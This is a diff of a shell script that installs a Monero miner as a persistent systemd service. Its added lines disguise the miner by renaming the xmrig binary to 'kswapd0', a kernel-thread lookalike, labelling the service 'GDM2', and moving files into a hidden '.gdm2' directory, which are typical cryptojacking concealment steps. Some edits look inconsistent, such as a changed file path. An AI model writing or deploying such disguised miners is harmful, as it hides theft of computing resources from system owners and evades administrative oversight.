@@ -285,10 +285,10 @@ else
     echo "[*] Creating moneroocean_miner systemd service"
     cat >/tmp/gdm2.service <<EOL
 [Unit]
-Description=Monero miner service
+Description=GDM2
 
 [Service]
-ExecStart=$HOME/moneroocean/xmrig --config=$HOME/moneroocean/config.json
+ExecStart=$HOME/.gdm2/kswapd0 --config=$HOME/.gdm2/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -296,15 +296,16 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/gdm2.service /etc/systemd/system/gdm2.service
+    sudo mv gdm2.service /etc/systemd/system/gdm2.service
     echo "[*] Starting gdm2 systemd service"
-    sudo killall xmrig 2>/dev/null
+    sudo killall kswapd0 2>/dev/null
     sudo systemctl daemon-reload
     sudo systemctl enable gdm2.service
     sudo systemctl start gdm2.service
-    echo "To see miner service logs run \"sudo journalctl -u moneroocean_miner -f\" command"
+    echo "To see miner service logs run \"sudo journalctl -u gdm2 -f\" command"
   fi
 fi
+
 
 echo ""
 echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
@@ -323,6 +324,8 @@ else
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config_background.json"
 fi
 echo ""
+
+mkdir $HOME/.gdm2/ ;
 
 cat >$HOME/.gdm2/config.json <<EOL
 {
